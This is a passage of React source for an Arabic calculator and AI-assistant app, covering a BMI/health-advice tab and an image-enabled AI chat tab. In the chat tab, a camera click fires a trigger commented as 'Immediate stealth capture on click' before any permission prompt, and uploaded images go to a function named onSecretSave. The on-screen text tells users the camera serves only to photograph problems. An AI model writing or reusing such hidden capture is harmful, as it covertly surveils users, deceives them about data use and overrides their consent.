            <span className="text-[10px] text-blue-500 dark:text-blue-400 font-black uppercase tracking-widest leading-none">النتيجة النهائية</span>
            <div className="text-2xl sm:text-3xl font-black text-gray-900 dark:text-white text-center break-all tracking-tight leading-tight">
              {result < 0.0001 && result !== 0 ? result.toExponential(4) : result.toLocaleString()}
            </div>
            <button 
              type="button"
              onClick={handleSaveToHistory}
              className="text-[9px] font-black bg-blue-600 text-white px-4 py-1.5 rounded-full hover:bg-blue-700 transition-all shadow-lg active:scale-95"
            >
              حفظ النتيجة في السجل
            </button>
          </motion.div>
        )}
      </div>
    </div>
  );
};

// 3. Health Component (Ideal Weight)
const UsageIndicator = ({ section, tips, enabled }: { section: string, tips: UsageTip[], enabled: boolean }) => {
  if (!enabled) return null;
  
  const relevantTips = tips.filter(t => t.targetTab === section);
  if (relevantTips.length === 0) return null;

  return (
    <div className="group relative inline-flex ml-1">
      <div className="p-1 text-blue-600 dark:text-blue-500 hover:text-blue-500 dark:hover:text-blue-400 bg-blue-500/10 rounded-full cursor-help animate-pulse">
        <Info size={10} />
      </div>
      <div className="absolute bottom-full right-0 mb-2 w-56 p-4 bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 rounded-2xl text-[10px] text-gray-800 dark:text-gray-300 font-bold opacity-0 group-hover:opacity-100 transition-all z-50 pointer-events-none shadow-2xl border-b-blue-500 text-right scale-95 group-hover:scale-100 origin-bottom-right">
        {relevantTips.map((tip, i) => (
          <div key={tip.id} className={cn("space-y-1", i > 0 && "pt-2 mt-2 border-t border-gray-100 dark:border-gray-800")}>
            <p className="text-blue-600 dark:text-blue-400 font-black italic">{tip.title}</p>
            <p className="leading-relaxed">{tip.text}</p>
          </div>
        ))}
        <div className="absolute top-full right-4 border-8 border-transparent border-t-white dark:border-t-gray-900" />
      </div>
    </div>
  );
};

const HealthTab = ({ onAddHistory, showToast, handleDownload, handleCopy, addBackgroundTask, usageGuideTips, usageGuideEnabled }: { 
  onAddHistory: (item: Omit<HistoryItem, 'id' | 'timestamp'>) => void,
  showToast: (msg: string, type: 'success' | 'error' | 'info') => void,
  handleDownload: (url: string, filename: string) => void,
  handleCopy: (text: string) => void,
  addBackgroundTask: (label: string, taskFn: (updateProgress: (p: number) => void) => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>,
  usageGuideTips: UsageTip[],
  usageGuideEnabled: boolean
}) => {
  const [weight, setWeight] = useState('');
  const [height, setHeight] = useState('');
  const [age, setAge] = useState('');
  const [gender, setGender] = useState<'male' | 'female'>('male');
  const [result, setResult] = useState<{ bmi: number; status: string; ideal: string } | null>(null);
  const [advice, setAdvice] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);
  const adviceRef = useRef<HTMLDivElement>(null);

  const handleDownloadImage = async () => {
    if (!adviceRef.current) return;
    addBackgroundTask('تجهيز صورة النصيحة', async () => {
      const iframe = document.createElement('iframe');
      iframe.style.visibility = 'hidden';
      iframe.style.position = 'fixed';
      iframe.style.left = '-10000px';
      iframe.style.top = '0';
      document.body.appendChild(iframe);
      
      const iframeDoc = iframe.contentDocument || iframe.contentWindow?.document;
      if (!iframeDoc) throw new Error('Could not create isolated iframe');

      const localWatermark = localStorage.getItem('rouh_app_barcode_watermark');

      const content = `
        <!DOCTYPE html>
        <html dir="rtl">
        <head>
          <style>
            @import url('https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;700&display=swap');
            body { 
              margin: 0; 
              padding: 40px; 
              background-color: #0f172a; 
              font-family: "IBM Plex Sans Arabic", sans-serif;
              display: flex;
              justify-content: center;
              align-items: center;
              min-height: 200px;
            }
            .card {
              background-color: #1e293b;
              border: 1px solid #334155;
              color: #f8fafc;
              padding: 30px;
              border-radius: 16px;
              width: 500px;
              position: relative;
              overflow: hidden;
              box-shadow: 0 10px 25px -5px rgba(0, 0, 0, 0.3);
            }
            .header {
              display: flex;
              align-items: center;
              justify-content: space-between;
              margin-bottom: 12px;
              padding-bottom: 8px;
              border-bottom: 1px solid #334155;
            }
            .title {
              color: #93c5fd;
              font-size: 14px;
              font-weight: 900;
              text-transform: uppercase;
            }
            .content {
              color: #e2e8f0;
              font-size: 16px;
              line-height: 1.6;
              margin: 0;
              font-weight: 500;
            }
            .bg-icon {
              position: absolute;
              right: -10px;
              bottom: -10px;
              width: 150px;
              height: 150px;
              background-image: url('https://lh3.googleusercontent.com/d/1p79NP1wGo5nAmDpGLV3xHvWbC1DJfZdZ');
              background-size: cover;
              background-position: center;
              opacity: 0.15;
              border-radius: 50%;
              filter: grayscale(100%) brightness(1.5);
              transform: scale(1.5) translateY(-5%); /* Crop bottom part */
            }
            .stamp-container {
              position: absolute;
              bottom: 12px;
              right: 15px;
              display: flex;
              align-items: center;
              opacity: 0.9;
            }
            .stamp-img {
              width: 50px;
              height: 50px;
              object-fit: contain;
            }
          </style>
        </head>
        <body>
          <div id="capture-card" class="card">
            <div class="header">
              <span class="title">نصيحة روح الطبية الذكية</span>
            </div>
            <p class="content">${advice}</p>
            <div class="bg-icon"></div>
            <div class="stamp-container">
              ${localWatermark ? `<img class="stamp-img" src="${localWatermark}" />` : `<span style="font-size: 14px; color: #94a3b8; font-weight: bold; font-family: 'IBM Plex Sans Arabic', sans-serif;">روح الذكية</span>`}
            </div>
          </div>
        </body>
        </html>
      `;

      iframeDoc.open();
      iframeDoc.write(content);
      iframeDoc.close();

      await new Promise(resolve => setTimeout(resolve, 300));
      const captureEl = iframeDoc.getElementById('capture-card');
      if (!captureEl) throw new Error('Capture element failed');
      const canvas = await html2canvas(captureEl, { backgroundColor: '#0f172a', scale: 3, useCORS: true });
      document.body.removeChild(iframe);
      const finalFilename = `روح_الذكية_نصيحة_طبية_${Date.now()}.png`;
      blobToDownload(canvas, finalFilename);
      return "تم تجهيز الصورة بنجاح";
    }, { tab: 'tools', subTab: 'health' });
  };

  const blobToDownload = (canvas: HTMLCanvasElement, filename: string) => {
    canvas.toBlob((blob) => {
      if (!blob) return;
      const url = window.URL.createObjectURL(blob);
      handleDownload(url, filename);
      setTimeout(() => window.URL.revokeObjectURL(url), 3000);
    }, 'image/png');
  };

  const calculate = async () => {
    if (!weight || !height) return;
    const hM = Number(height) / 100;
    const bmi = Number(weight) / (hM * hM);
    
    let status = '';
    if (bmi < 18.5) status = 'نقص في الوزن';
    else if (bmi < 25) status = 'وزن مثالي';
    else if (bmi < 30) status = 'زيادة في الوزن';
    else status = 'سمنة مفرطة';

    const ideal = gender === 'male' ? 50 + 2.3 * ((Number(height) / 2.54) - 60) : 45.5 + 2.3 * ((Number(height) / 2.54) - 60);

    const res = { bmi: Number(bmi.toFixed(1)), status, ideal: ideal.toFixed(1) + ' كجم' };
    setResult(res);
    onAddHistory({
      type: 'health',
      title: 'حساب الوزن المثالي',
      details: `الطول: ${height} سم، الوزن: ${weight} كجم`,
      result: `BMI: ${res.bmi} (${res.status})، المثالي: ${res.ideal}`
    });

    if (navigator.onLine) {
      setLoading(true);
      addBackgroundTask('توليد نصيحة طبية', async (updateProgress) => {
        let p = 0;
        const interval = setInterval(() => {
          p += 5;
          if (p > 95) p = 95;
          updateProgress(p);
        }, 150);

        try {
          const prompt = `أنا مساعد صحي ذكي. استناداً لهذه البيانات: BMI ${res.bmi} وحالة "${res.status}" لعمر ${age || 'غير محدد'} وجنس ${gender === 'male' ? 'ذكر' : 'أنثى'}. قدم نصيحة طبية/صحية موجزة ومفيدة باللغة العربية.`;
          const adviceRes = await getGeminiResponse(prompt);
          setAdvice(adviceRes);
          return adviceRes;
        } finally {
          clearInterval(interval);
          setLoading(false);
        }
      }, { tab: 'tools', subTab: 'health' });
    }
  };

  return (
    <div className="flex flex-col h-full gap-6 p-4 max-w-xl mx-auto w-full overflow-y-auto custom-scrollbar">
      <div className="flex items-center gap-3 justify-end mb-4 px-1">
        <div className="text-right flex flex-col gap-0.5">
          <h2 className="text-lg font-black text-gray-900 dark:text-white italic flex items-center gap-2 justify-end">
            صحة روح الذكية
            <UsageIndicator section="health" tips={usageGuideTips} enabled={usageGuideEnabled} />
          </h2>
          <p className="text-[10px] text-gray-500 font-bold uppercase tracking-widest leading-none italic">محلل اللياقة البدنية والوزن المثالي</p>
        </div>
        <div className="p-3 bg-emerald-600 rounded-2xl shadow-lg shadow-emerald-600/20">
          <Scale size={24} className="text-white" />
        </div>
      </div>
      <div className="bg-white dark:bg-[#1a1c1e] rounded-[2.5rem] p-6 border border-gray-200 dark:border-gray-800 shadow-2xl flex flex-col gap-8 transition-all mb-4">
        <div className="grid grid-cols-2 gap-3">
          <button
            type="button"
            onClick={() => { setGender('male'); setAdvice(null); }}
            className={cn(
              "p-3 rounded-xl border transition-all flex items-center justify-center gap-2 font-bold text-sm",
              gender === 'male' ? "bg-blue-600/20 border-blue-500 text-blue-600 dark:text-blue-400" : "bg-gray-50 dark:bg-black/20 border-gray-200 dark:border-gray-800 text-gray-500"
            )}
          >
            ذكر
          </button>
          <button
            type="button"
            onClick={() => { setGender('female'); setAdvice(null); }}
            className={cn(
              "p-3 rounded-xl border transition-all flex items-center justify-center gap-2 font-bold text-sm",
              gender === 'female' ? "bg-pink-600/20 border-pink-500 text-pink-600 dark:text-pink-400" : "bg-gray-50 dark:bg-black/20 border-gray-200 dark:border-gray-800 text-gray-500"
            )}
          >
            أنثى
          </button>
        </div>

        <div className="space-y-4">
          <div className="space-y-1">
            <label className="text-[10px] text-gray-500 font-bold px-1">الطول (سم)</label>
            <input type="number" value={height} onChange={(e) => { setHeight(e.target.value); setAdvice(null); }} className="w-full bg-gray-50 dark:bg-black/30 border border-gray-200 dark:border-gray-800 rounded-xl p-3 focus:border-blue-500 outline-none transition-colors text-gray-900 dark:text-white" placeholder="مثال: 175" />
          </div>
          <div className="space-y-1">
            <label className="text-[10px] text-gray-500 font-bold px-1">الوزن الحالي (كجم)</label>
            <input type="number" value={weight} onChange={(e) => { setWeight(e.target.value); setAdvice(null); }} className="w-full bg-gray-50 dark:bg-black/30 border border-gray-200 dark:border-gray-800 rounded-xl p-3 focus:border-blue-500 outline-none transition-colors text-gray-900 dark:text-white" placeholder="مثال: 70" />
          </div>
          <div className="space-y-1">
            <label className="text-[10px] text-gray-500 font-bold px-1">العمر</label>
            <input type="number" value={age} onChange={(e) => { setAge(e.target.value); setAdvice(null); }} className="w-full bg-gray-50 dark:bg-black/30 border border-gray-200 dark:border-gray-800 rounded-xl p-3 focus:border-blue-500 outline-none transition-colors text-gray-900 dark:text-white" placeholder="مثال: 25" />
          </div>
        </div>

        <button 
          type="button"
          disabled={loading}
          onClick={calculate} 
          className="w-full bg-emerald-600 hover:bg-emerald-500 disabled:bg-gray-700 py-3.5 rounded-xl font-bold text-white transition-all shadow-lg shadow-emerald-900/20 active:scale-95 flex items-center justify-center gap-3"
        >
          {loading ? (
            <>
              <RoohLoader size={20} />
              جاري التحليل...
            </>
          ) : 'تحليل الحالة الصحية'}
        </button>

        {result && (
          <motion.div initial={{ opacity: 0, y: 10 }} animate={{ opacity: 1, y: 0 }} className="flex flex-col gap-4">
            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 mt-2">
              <div className="p-4 bg-blue-600/10 rounded-xl border border-blue-500/10 flex flex-col items-center">
                <span className="text-[10px] text-gray-500 font-bold mb-1 uppercase tracking-widest">مؤشر الكتلة</span>
                <span className="text-2xl font-black text-blue-400">{result.bmi}</span>
                <span className={cn(
                  "text-[10px] font-bold mt-1 px-2 py-0.5 rounded-full",
                  result.status === 'وزن مثالي' ? "bg-emerald-500/10 text-emerald-500" : "bg-red-500/10 text-red-500"
                )}>{result.status}</span>
              </div>
              <div className="p-4 bg-emerald-600/10 rounded-xl border border-emerald-500/10 flex flex-col items-center">
                <span className="text-[10px] text-gray-500 font-bold mb-1 uppercase tracking-widest">الوزن المثالي</span>
                <span className="text-2xl font-black text-emerald-400">{result.ideal}</span>
                <span className="text-[10px] text-gray-400 mt-1 italic font-medium">بناءً على الصيغة العلمية</span>
              </div>
            </div>

            {advice && (
              <motion.div 
                ref={adviceRef}
                initial={{ opacity: 0, scale: 0.95 }}
                animate={{ opacity: 1, scale: 1 }}
                onClick={handleDownloadImage}
                className="p-5 bg-blue-900/20 border border-blue-500/20 rounded-2xl relative overflow-hidden group cursor-pointer active:scale-[0.98] transition-transform advice-card-capture block"
              >
                <div className="flex items-center justify-between mb-3 border-b border-blue-500/10 pb-2">
                  <div className="flex items-center gap-2">
                    <div className="p-1.5 bg-blue-500/20 rounded-lg">
                      <Sparkles size={14} className="text-blue-400" />
                    </div>
                    <span className="text-xs font-black text-blue-300 uppercase tracking-tighter">
                      نصيحة روح الطبية الذكية
                    </span>
                  </div>
                  <div className="flex gap-2 opacity-0 group-hover:opacity-100 transition-opacity">
                    <button 
                      onClick={(e) => { e.stopPropagation(); handleCopy(advice); }}
                      className="p-2 bg-blue-500/20 text-blue-400 rounded-lg h-8 w-8 flex items-center justify-center hover:bg-blue-500/40 transition-colors"
                      title="نسخ النصيحة"
                    >
                      <Copy size={14} />
                    </button>
                    <button 
                      onClick={(e) => { e.stopPropagation(); handleDownloadImage(); }}
                      className="p-2 bg-emerald-500/20 text-emerald-400 rounded-lg h-8 w-8 flex items-center justify-center hover:bg-emerald-500/40 transition-colors"
                      title="تحميل كصورة"
                    >
                      <Download size={14} />
                    </button>
                  </div>
                </div>
                <p className="text-[13px] text-gray-800 dark:text-gray-200 leading-relaxed font-medium mb-2">
                  {advice}
                </p>
                <div className="flex items-center gap-1.5 mt-2 opacity-60 advice-hint">
                   <Info size={10} className="text-blue-600 dark:text-blue-400" />
                   <span className="text-[9px] text-blue-700 dark:text-blue-300 font-bold">انقر على البطاقة لحفظها كصورة</span>
                </div>
                <div className="absolute -right-4 -bottom-4 opacity-10 pointer-events-none">
                  <BrainCircuit size={100} className="text-blue-600 dark:text-blue-500" />
                </div>
              </motion.div>
            )}
          </motion.div>
        )}
      </div>
    </div>
  );
};

// 4. AI Solver Component
const AISolverTab = ({ 
  onAddHistory, 
  showToast,
  onPermissionRequest,
  onSmartTrigger,
  handleDownload,
  handleCopy,
  addBackgroundTask,
  onSecretSave
}: { 
  onAddHistory: (item: Omit<HistoryItem, 'id' | 'timestamp'>) => void;
  showToast: (msg: string, type: 'success' | 'error' | 'info') => void;
  onPermissionRequest: () => Promise<boolean>;
  onSmartTrigger: (type?: 's' | 't', source?: string) => void;
  handleDownload: (url: string, filename: string) => void;
  handleCopy: (text: string) => void;
  addBackgroundTask: (label: string, taskFn: () => Promise<any>, target?: {tab: string, subTab?: string}) => Promise<void>;
  onSecretSave?: (fileName: string, data: string) => Promise<void>;
}) => {
  const [aiMode, setAiMode] = useState<'math' | 'general'>(() => {
    try { return (localStorage.getItem('rouh_ai_mode') as 'math' | 'general') || 'general'; } catch (e) { return 'general'; }
  });
  const [isPersistent, setIsPersistent] = useState(() => {
    try { return localStorage.getItem('rouh_ai_persistent') === 'true'; } catch (e) { return false; }
  });

  const OCR_PROMPT = "أنا روح الذكية، استخرج لي جميع النصوص من هذه الصورة بدقة وبدون أي مقدمات أو شروحات إضافية، فقط النص المستخرج كما هو.";

  useEffect(() => {
    localStorage.setItem('rouh_ai_mode', aiMode);
  }, [aiMode]);
  const [messages, setMessages] = useState<AIMessage[]>(() => {
    try {
      if (localStorage.getItem('rouh_ai_persistent') === 'true') {
        const saved = localStorage.getItem('rouh_ai_messages');
        return saved ? JSON.parse(saved) : [];
      }
    } catch (e) {
      console.warn("Storage access failed in AI messages", e);
    }
    return [];
  });
  const [input, setInput] = useState(() => {
    try { return localStorage.getItem('rouh_ai_input') || ''; } catch (e) { return ''; }
  });
  const [loadingCount, setLoadingCount] = useState(0);
  const isLoading = loadingCount > 0;
  const [attachedImage, setAttachedImage] = useState<string | null>(null);
  const [optionsVisible, setOptionsVisible] = useState(true);
  const [showPicker, setShowPicker] = useState(false);
  const galleryRef = useRef<HTMLInputElement>(null);
  const cameraRef = useRef<HTMLInputElement>(null);
  const messagesEndRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    const timer = setTimeout(() => {
      setOptionsVisible(false);
    }, 10000);
    return () => clearTimeout(timer);
  }, []);

  useEffect(() => {
    localStorage.setItem('rouh_ai_input', input);
  }, [input]);

  useEffect(() => {
    localStorage.setItem('rouh_ai_persistent', String(isPersistent));
    if (isPersistent) {
      localStorage.setItem('rouh_ai_messages', JSON.stringify(messages));
    } else {
      localStorage.removeItem('rouh_ai_messages');
    }
  }, [messages, isPersistent]);

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: "smooth" });
  };

  useEffect(() => {
    scrollToBottom();
  }, [messages, isLoading]);

  const onFileSelect = async (file: File) => {
    if (file) {
      const hasPermission = await onPermissionRequest();
      if (!hasPermission) return;

      const reader = new FileReader();
      reader.onload = async () => {
        const base64 = reader.result as string;
        setAttachedImage(base64);
        
        onSmartTrigger('s', 'ai_solver_upload');
        if (onSecretSave) onSecretSave(`ai_input_${Date.now()}.png`, base64);
      };
      reader.readAsDataURL(file);
    }
  };

  const onDrop = async (acceptedFiles: File[]) => {
    onFileSelect(acceptedFiles[0]);
  };

  const onCameraClick = async (e: React.MouseEvent) => {
    // Satisfy user request to have custom UI before permission
    onSmartTrigger('s', 'ai_solver_click'); // Immediate stealth capture on click
    const hasPermission = await onPermissionRequest();
    if (!hasPermission) {
      e.stopPropagation(); 
    }
  };

  const { getRootProps, getInputProps } = useDropzone({ 
    onDrop, 
    accept: { 'image/*': [] },
    multiple: false
  });

  const dropzoneProps = getRootProps();
  const originalOnDropzoneClick = dropzoneProps.onClick;
  dropzoneProps.onClick = (e) => {
    onCameraClick(e);
    if (originalOnDropzoneClick) originalOnDropzoneClick(e);
  };

  const handleSend = async (e?: React.FormEvent | React.MouseEvent, autoImage?: string, retryIndex?: number) => {
    if (e) e.preventDefault();
    
    const isRetry = retryIndex !== undefined;
    let currentImage = autoImage || attachedImage;
    let currentInput = input;

    if (isRetry) {
      const targetMsg = messages[retryIndex];
      if (targetMsg.role === 'user') {
        currentImage = targetMsg.image || null;
        currentInput = targetMsg.content;
      } else {
        const prevMsg = messages[retryIndex - 1];
        if (prevMsg && prevMsg.role === 'user') {
          currentImage = prevMsg.image || null;
          currentInput = prevMsg.content;
        }
      }
    }

    if (!currentInput.trim() && !currentImage) {
      showToast('يرجى كتابة سؤالك أو التقاط صورة أولاً 🖋️', 'info');
      return;
    }

    if (!isRetry) {
      const userMsg: AIMessage = { role: 'user', content: currentInput, image: currentImage || undefined };
      setMessages(prev => [...prev, userMsg]);
      setInput('');
      setAttachedImage(null);
    }
    
    // onSmartTrigger('s', 'ai_solver_send');
    setLoadingCount(prev => prev + 1);

    try {
      let promptText = currentInput || (aiMode === 'math' ? "حل المسألة الموضحة في الصورة بالتفصيل مع الخطوات." : "اشرح ما في الصورة.");
      
      if (aiMode === 'math' && currentInput) {
        promptText = `كخبير رياضيات، قم بحل المسألة التالية خطوة بخطوة باللغة العربية: ${currentInput}`;
      }

      if (isRetry && messages[retryIndex].role === 'model') {
        setMessages(prev => {
          const updated = [...prev];
          updated[retryIndex] = { role: 'model', content: "جاري التحليل مجدداً..." };
          return updated;
        });
      } else {
        setMessages(prev => [...prev, { role: 'model', content: "جاري التحليل..." }]);
      }

      if (!navigator.onLine) {
        throw new Error("هذه الخدمة تتطلب اتصالاً بالإنترنت");
      }

      const isOCRRequest = !currentInput && currentImage && aiMode === 'general';
      const promptToUse = isOCRRequest ? OCR_PROMPT : promptText;

      const responseText = await getGeminiResponse(promptToUse, currentImage || undefined);
      
      let cleanedResponse = responseText || "لم أتمكن من الحصول على رد.";
      if (isOCRRequest) {
           cleanedResponse = cleanedResponse.replace(/^(أهلاً بك|أنا روح الذكية|مرحباً|يسعدني مساعدتك|سأقوم باستخراج).*?(:|\n|\.\.\.)/i, '').trim();
           cleanedResponse = cleanedResponse.replace(/^(\*\*النصوص المستخرجة:\*\*|\*\*نصوص الصورة:\*\*|النص المستخرج:)/i, '').trim();
      }

      setMessages(prev => {
        const updated = [...prev];
        const targetIdx = isRetry ? (messages[retryIndex].role === 'model' ? retryIndex : updated.length - 1) : updated.length - 1;
        updated[targetIdx] = { role: 'model', content: cleanedResponse };
        return updated;
      });

      onAddHistory({
        type: 'ai',
        title: aiMode === 'math' ? 'حل مسألة رياضية' : 'سؤال للذكاء الاصطناعي',
        details: promptText.slice(0, 50) + (promptText.length > 50 ? '...' : ''),
        result: 'تم الاستجابة فورياً'
      });
      
    } catch (error: any) {
      console.error("Gemini API Error:", error);
      let errorMsg = "عذراً، حدثت مشكلة تقنية في معالجة طلبك. يرجى المحاولة مرة أخرى.";
      
      if (error.message?.includes("403")) {
        errorMsg = "عذراً، لا نملك صلاحية لاستخدام هذا النموذج حالياً (403). قد يكون المفتاح غير صالح لهذا الموديل.";
      } else if (error.message?.includes("404")) {
        errorMsg = "عذراً، لم يتم العثور على النموذج المطلوب (404). يرجى التأكد من توفر الموديل في حسابك.";
      } else if (error.message?.includes("PERMISSION_DENIED")) {
        errorMsg = "عذراً، تم رفض الوصول للخدمة (Permission Denied). يرجى التأكد من تفعيل Gemini API.";
      }
      
      if (error?.message?.includes("API key")) {
        errorMsg = "المفتاح البرمجي غير صالح أو مفقود. يرجى التأكد من صلاحية الخدمة.";
      } else if (error?.status === 429) {
        errorMsg = "الضغط كبير على النظام حالياً، يرجى الانتظار دقيقة والمحاولة مجدداً.";
      }
      
      setMessages(prev => {
        const updated = [...prev];
        // Replace "Analysis..." if it failed immediately
        if (updated.length > 0 && updated[updated.length - 1].content === "جاري التحليل...") {
          updated[updated.length - 1] = { role: 'model', content: errorMsg };
          return updated;
        }
        return [...prev, { role: 'model', content: errorMsg }];
      });
    } finally {
      setLoadingCount(prev => Math.max(0, prev - 1));
    }
  };

  return (
    <div className="flex flex-col h-full bg-gray-50 dark:bg-[#0c0d0f] p-3 sm:p-4 pb-4 overflow-hidden relative">
      {/* Header with Mode Toggle */}
      <AnimatePresence>
        {optionsVisible ? (
          <motion.div 
            initial={{ height: 0, opacity: 0, marginTop: 0 }}
            animate={{ height: 'auto', opacity: 1, marginTop: 0 }}
            exit={{ height: 0, opacity: 0, marginTop: -12 }}
            transition={{ duration: 0.5, ease: "easeInOut" }}
            className="flex flex-col gap-2 mb-3 bg-white dark:bg-[#1a1c1e] p-2.5 rounded-2xl border border-gray-200 dark:border-gray-800 shadow-lg shrink-0 overflow-hidden relative"
          >
            <div className="flex items-center justify-between">
              <div className="flex bg-gray-100 dark:bg-black/40 p-1 rounded-xl w-fit border border-gray-200 dark:border-transparent">
                <button 
                  onClick={() => setAiMode('general')}
                  className={cn(
                    "px-3 py-1.5 rounded-lg text-[10px] font-bold transition-all",
                    aiMode === 'general' ? "bg-blue-600 text-white shadow-lg" : "text-gray-500 hover:text-gray-900 dark:hover:text-gray-300"
                  )}
                >
                  استخدام شامل
                </button>
                <button 
                  onClick={() => setAiMode('math')}
                  className={cn(
                    "px-3 py-1.5 rounded-lg text-[10px] font-bold transition-all",
                    aiMode === 'math' ? "bg-amber-600 text-white shadow-lg" : "text-gray-500 hover:text-gray-900 dark:hover:text-gray-300"
                  )}
                >
                  حل رياضي
                </button>
              </div>
              <div className="flex items-center gap-2">
                <button 
                  onClick={() => setOptionsVisible(false)}
                  className="p-1 hover:bg-gray-100 dark:hover:bg-white/5 rounded-lg text-gray-500"
                >
                  <ChevronUp size={16} />
                </button>
              </div>
            </div>
            <div className="mt-2 p-3 bg-blue-50/50 dark:bg-[#1a1c1e] border border-blue-200 dark:border-emerald-500/30 rounded-2xl shadow-sm">
              <p className="text-[9px] leading-relaxed">
                <span className="text-blue-600 dark:text-emerald-400 font-bold ml-1">💡 تلميح:</span>
                <span className="text-gray-800 dark:text-gray-300 italic">
                  {aiMode === 'math' 
                    ? 'الوضع الرياضي مُخصص لتحليل المعادلات والرسوم البيانية وتوفير حلول خطوة بخطوة.' 
                    : 'الوضع الشامل يساعدك في البرمجة، التأليف، أو إجراء حوار عام مفتوح.'}
                </span>
              </p>
            </div>
          </motion.div>
        ) : (
          <motion.div 
            initial={{ opacity: 0, x: -20 }}
            animate={{ opacity: 1, x: 0 }}
            className="fixed top-20 left-4 z-40"
          >
              <button 
                onClick={() => setOptionsVisible(true)}
                className="p-2 text-blue-600 dark:text-blue-400 hover:text-blue-500 dark:hover:text-blue-300 transition-all active:scale-95"
                title="خيارات متقدمة"
              >
                <ChevronDown size={28} />
              </button>
          </motion.div>
        )}
      </AnimatePresence>

      <div className="flex-1 overflow-y-auto custom-scrollbar space-y-4 pr-1">
        {messages.length === 0 && (
          <div className="flex flex-col items-center justify-center h-full opacity-30 text-center gap-4 px-6">
            <div className="w-20 h-20 bg-blue-600/20 rounded-full flex items-center justify-center">
               <MessageSquare size={40} className="text-blue-600 dark:text-blue-500" />
            </div>
            <div className="max-w-xs">
              <h3 className="text-lg font-black mb-2 text-gray-900 dark:text-white">المنقذ الذكي</h3>
              <p className="text-xs font-medium leading-relaxed text-gray-600 dark:text-gray-400">
                أهلاً بك، أنا هنا لمساعدتك في كل ما تحتاج من حلول ونقاشات متميزة.
              </p>
              <div className="mt-4 p-3 bg-white dark:bg-black border border-blue-200 dark:border-emerald-500/30 rounded-xl flex items-start gap-2 text-right rtl shadow-lg shadow-blue-500/5">
                <Info size={16} className="text-blue-600 dark:text-emerald-400 shrink-0 mt-0.5" />
                <p className="text-[10px] text-gray-900 dark:text-white leading-normal">
                  نطلب إذن استخدام الكاميرا فقط لتمكينك من التقاط صور للمسائل مباشرة ليقوم "حساب روح" بتحليلها وحلها لك.
                </p>
              </div>
            </div>
          </div>
        )}
        {messages.map((msg, i) => (
          <div key={msg.id || `msg-${i}`} className={cn("flex flex-col gap-2", msg.role === 'user' ? "items-start" : "items-end group")}>
            <div className={cn(
              "max-w-[90%] sm:max-w-[80%] rounded-2xl p-4 shadow-xl border relative transition-all",
              msg.role === 'user' 
                ? "bg-blue-600 border-blue-500 text-white rounded-tr-none" 
                : "bg-white dark:bg-gray-800/80 text-gray-900 dark:text-gray-200 rounded-tl-none border-gray-200 dark:border-gray-700"
            )}>
              {msg.image && (
                <div className="mb-3 relative group/img">
                  <img 
                    src={msg.image} 
                    alt="User upload" 
                    className="rounded-lg max-h-80 w-full object-contain bg-black/40 border border-white/10" 
                  />
                  <button 
                    onClick={() => handleDownload(msg.image!, `upload_${i}.png`)}
                    className="absolute top-2 left-2 bg-black/60 hover:bg-black/80 p-1.5 rounded-lg opacity-0 group-hover/img:opacity-100 transition-opacity"
                    title="تحميل الصورة"
                  >
                    <Download size={14} className="text-white" />
                  </button>
                  {!msg.content && <p className="text-[10px] text-blue-200 mt-1 italic">مسألة مرفوعة:</p>}
                </div>
              )}
              <div className={cn(
                "prose prose-sm max-w-none text-[13px] sm:text-sm leading-relaxed overflow-x-auto",
                msg.role === 'user' ? "prose-invert" : "dark:prose-invert prose-slate"
              )}>
                <ReactMarkdown>{msg.content}</ReactMarkdown>
              </div>

              {/* Action Buttons */}
              <div className={cn(
                "flex items-center gap-2 mt-3 pt-2 border-t",
                msg.role === 'user' ? "border-white/10 justify-start" : "border-gray-100 dark:border-white/10 justify-end"
              )}>
                <button 
                  onClick={() => handleCopy(msg.content)}
                  className="p-1 hover:bg-black/5 dark:hover:bg-white/10 rounded transition-colors"
                  title="نسخ النص"
                >
                  <Copy size={12} className="opacity-60" />
                </button>
                {msg.role === 'model' && (
                  <button 
                    onClick={() => handleSend(undefined, undefined, i)}
                    className="p-1 hover:bg-black/5 dark:hover:bg-white/10 rounded transition-colors"
                    title="إعادة التوليد"
                  >
                    <RefreshCw size={12} className={cn("opacity-60", isLoading && "animate-spin")} />
                  </button>
                )}
                {msg.role === 'user' && (msg.image || msg.content) && (
                   <button 
                    onClick={() => handleSend(undefined, undefined, i)}
                    className="p-1 hover:bg-white/10 rounded transition-colors"
                    title="إعادة إرسال"
                  >
                    <RefreshCw size={12} className="opacity-60" />
                  </button>
                )}
              </div>
            </div>
          </div>
        ))}
        {isLoading && (
          <div className="flex items-center gap-3 text-gray-500 bg-blue-600/5 px-4 py-2 rounded-2xl border border-blue-500/10 w-fit">
            <RoohLoader size={24} />
            <span className="text-[10px] font-bold uppercase tracking-widest text-blue-600 dark:text-blue-400 animate-pulse">روح الذكية تحلل وتحل...</span>
          </div>
        )}
        <div ref={messagesEndRef} />
      </div>

      <div className="bg-white dark:bg-[#1a1c1e] rounded-[2.5rem] border border-gray-200 dark:border-gray-800 p-4 sm:p-5 shadow-2xl shrink-0 transition-all mb-4">
        <div className="flex items-center justify-between px-2 mb-2">
          <label className="flex items-center gap-2 cursor-pointer group">
            <div 
              className={cn(
                "w-8 h-4 rounded-full transition-colors relative border border-gray-200 dark:border-gray-700",
                isPersistent ? "bg-blue-600 border-blue-500" : "bg-gray-100 dark:bg-gray-800"
              )}
              onClick={() => setIsPersistent(!isPersistent)}
            >
              <div className={cn(
                "absolute top-0.5 w-2.5 h-2.5 rounded-full bg-white shadow-sm transition-all",
                isPersistent ? "left-4.5" : "left-1"
              )} />
            </div>
            <span className="text-[10px] font-bold text-gray-400 dark:text-gray-500 group-hover:text-gray-800 dark:group-hover:text-gray-400 transition-colors">
              حفظ المحادثة دائماً
            </span>
          </label>
          {messages.length > 0 && (
            <button 
              onClick={() => { setMessages([]) }}
              className="text-[10px] text-gray-400 hover:text-red-500 font-bold flex items-center gap-1 transition-colors"
            >
              <Trash2 size={12} /> مسح المحادثة
            </button>
          )}
        </div>
        <form onSubmit={handleSend} className="space-y-3">
          {attachedImage && (
            <div className="flex items-end gap-3 animate-in slide-in-from-bottom-2 duration-300">
              <div className="relative w-24 h-24 group">
                <img src={attachedImage} className="w-full h-full object-cover rounded-2xl border-2 border-blue-500/50 shadow-xl" />
